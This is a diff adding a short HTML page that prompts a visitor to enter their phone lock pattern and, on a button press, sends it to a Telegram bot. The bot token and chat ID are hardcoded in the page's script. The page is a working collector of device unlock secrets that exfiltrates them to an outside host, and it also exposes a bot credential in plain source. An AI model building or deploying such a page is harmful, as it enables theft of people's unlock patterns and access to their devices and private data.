@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Send Lock Pattern</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-top: 100px;
+    }
+    input {
+      padding: 10px;
+      font-size: 16px;
+      width: 250px;
+      margin-bottom: 20px;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
+      background-color: #0088cc;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #0077b3;
+    }
+  </style>
+</head>
+<body>
+  <h2>Enter Your Lock Pattern</h2>
+  <input type="text" id="patternInput" placeholder="e.g. ULDR or 12369" />
+  <button onclick="sendPattern()">Send to Telegram</button>
+
+  <script>
+    function sendPattern() {
+      const pattern = document.getElementById("patternInput").value.trim();
+      if (!pattern) {
+        alert("Please enter a pattern.");
+        return;
+      }
+
+      const token = "5828170484:AAGx5Lbjc9ebQd0YuJ7l-REnXSUoS7OhjAc";
+      const chatId = "1353504783";
+      const message = `📱 Lock Pattern Entered: ${pattern}`;
+
+      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+      fetch(url)
+        .then(res => {
+          if (res.ok) {
+            alert("✅ Pattern sent to Telegram!");
+            document.getElementById("patternInput").value = "";
+          } else {
+            alert("❌ Failed to send pattern.");
+          }
+        })
+        .catch(() => alert("❌ Network error."));
+    }
+  </script>
+</body>
+</html>
